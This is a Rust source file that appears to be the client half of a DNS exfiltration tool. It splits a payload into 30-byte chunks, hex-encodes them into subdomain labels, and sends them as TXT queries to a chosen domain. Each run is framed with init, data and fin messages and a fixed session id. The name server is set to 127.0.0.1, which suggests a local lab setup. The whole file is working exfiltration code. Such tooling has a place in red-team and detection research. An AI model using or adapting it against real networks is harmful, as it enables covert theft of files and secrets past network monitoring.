use crate::error::DnsexError;
use hickory_client::client::{AsyncClient, ClientHandle};
use hickory_proto::rr::{DNSClass, Name, RData, RecordType};
use hickory_proto::udp::UdpClientStream;
use std::net::SocketAddr;
use std::str::FromStr;
use tokio::net::UdpSocket as TokioUdpSocket;
use tokio::time::{Duration, sleep};

pub struct Client {
    domain: String,
    port: u16,
}

impl Client {
    pub fn new(domain: impl Into<String>, port: u16) -> Self {
        Self {
            domain: domain.into(),
            port,
        }
    }

    pub async fn send_payload(&self, payload: &[u8]) -> Result<(), DnsexError> {
        let name_server: SocketAddr = format!("127.0.0.1:{}", self.port).parse().unwrap();
        let stream = UdpClientStream::<TokioUdpSocket>::new(name_server);
        let client_connect_future = AsyncClient::connect(stream);

        let (mut client, background_task) = client_connect_future.await?;
        tokio::spawn(background_task);

        let chunk_size = 30;
        let chunks: Vec<&[u8]> = payload.chunks(chunk_size).collect();
        let total_chunks = chunks.len();

        let session_id = "ffca"; // TODO: Generate random

        println!("exfiltrating {} chunks to {}", total_chunks, self.domain);

        // init
        let filename_hex = hex::encode("exfiltrated_data.bin");
        //<payload>.<seq/total>.<id>.<flag>.<domain>
        let init_fqdn = format!(
            "{}.{}.{}.i.{}",
            filename_hex, total_chunks, session_id, self.domain
        );
        self.send_query(&mut client, &init_fqdn).await?;
        sleep(Duration::from_millis(100)).await;

        // data
        for (seq, chunk) in chunks.iter().enumerate() {
            let hex_data = hex::encode(chunk);
            let data_fqdn = format!("{}.{}.{}.d.{}", hex_data, seq, session_id, self.domain);

            println!("Sending chunk {}/{}: {}", seq + 1, total_chunks, data_fqdn);
            self.send_query(&mut client, &data_fqdn).await?;

            sleep(Duration::from_millis(100)).await;
        }

        // fin
        let fin_hex = hex::encode("EOF");
        let fin_fqdn = format!(
            "{}.{}.{}.f.{}",
            fin_hex, total_chunks, session_id, self.domain
        );
        println!("Sending FIN packet: {}", fin_fqdn);
        self.send_query(&mut client, &fin_fqdn).await?;

        println!("done.");
        Ok(())
    }

    async fn send_query(&self, client: &mut AsyncClient, fqdn: &str) -> Result<(), DnsexError> {
        let domain_name = Name::from_str(fqdn)?;

        let response = client
            .query(domain_name, DNSClass::IN, RecordType::TXT)
            .await?;

        if response.answers().is_empty() {
            println!("Response code: {}", response.response_code());
        } else {
            for answer in response.answers() {
                if let Some(RData::TXT(txt)) = answer.data() {
                    println!("Server ACK: {}", txt);
                }
            }
        }
        Ok(())
    }
}
